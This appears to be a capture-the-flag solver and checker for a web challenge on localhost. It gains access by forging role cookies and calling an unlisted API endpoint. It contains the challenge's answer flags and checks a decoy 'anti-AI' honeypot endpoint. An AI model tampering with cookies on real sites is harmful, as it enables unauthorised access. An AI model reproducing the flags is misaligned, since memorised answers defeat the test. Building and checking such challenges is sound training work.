#!/usr/bin/env python3
"""
Automated Solver & Verification Script
Challenge: Cookie / API: Faculty Exam Vault Inspection
Author: Tanish Shah (@tanishshahh)
"""

import sys
import requests

TARGET_BASE = "http://127.0.0.1:5001"
EXPECTED_TRUE_FLAG = "case{cookie_role_tamper_faculty_access}"
EXPECTED_HONEY_FLAG = "case{faculty_admin_portal_root_auth_2026}"

def test_solve_cookie(base_url):
    print("[*] Testing Solution Path 1: Client Cookie Elevation...")
    cookies = {
        "role": "faculty_coordinator",
        "access_tier": "99"
    }
    resp = requests.get(base_url, cookies=cookies, timeout=5)
    if resp.status_code != 200:
        print(f"[-] Failed with HTTP status {resp.status_code}")
        return False

    if EXPECTED_TRUE_FLAG in resp.text:
        print(f"[+] Flag found via cookie elevation: {EXPECTED_TRUE_FLAG}")
        return True
    else:
        print("[-] Flag not found in HTML response.")
        return False

def test_solve_api(base_url):
    print("[*] Testing Solution Path 2: Unlisted REST Endpoint...")
    url = f"{base_url}/api/v1/faculty/drafts/oop99"
    resp = requests.get(url, timeout=5)
    if resp.status_code != 200:
        print(f"[-] API request failed: {resp.status_code}")
        return False

    data = resp.json()
    flag = data.get("flag")
    if flag == EXPECTED_TRUE_FLAG:
        print(f"[+] Flag found via REST API: {flag}")
        return True
    else:
        print(f"[-] Unexpected flag in API response: {flag}")
        return False

def test_honeypot(base_url):
    print("[*] Verifying Anti-AI Honeyflag Endpoint (/api/v1/admin/secret)...")
    url = f"{base_url}/api/v1/admin/secret"
    resp = requests.get(url, timeout=5)
    data = resp.json()
    if data.get("flag") == EXPECTED_HONEY_FLAG:
        print(f"[+] Honeypot triggered properly with decoy flag: {EXPECTED_HONEY_FLAG}")
        return True
    else:
        print(f"[-] Honeypot failed: {data}")
        return False

def main():
    base_url = sys.argv[1] if len(sys.argv) > 1 else TARGET_BASE
    print(f"[*] Targeting Cookie/API Challenge at {base_url}")
    
    ok1 = test_solve_cookie(base_url)
    ok2 = test_solve_api(base_url)
    ok3 = test_honeypot(base_url)

    if ok1 and ok2 and ok3:
        print("\n[SUCCESS] All verification tests passed cleanly (Exit 0).")
        sys.exit(0)
    else:
        print("\n[FAILURE] Verification checks failed.")
        sys.exit(1)

if __name__ == "__main__":
    main()
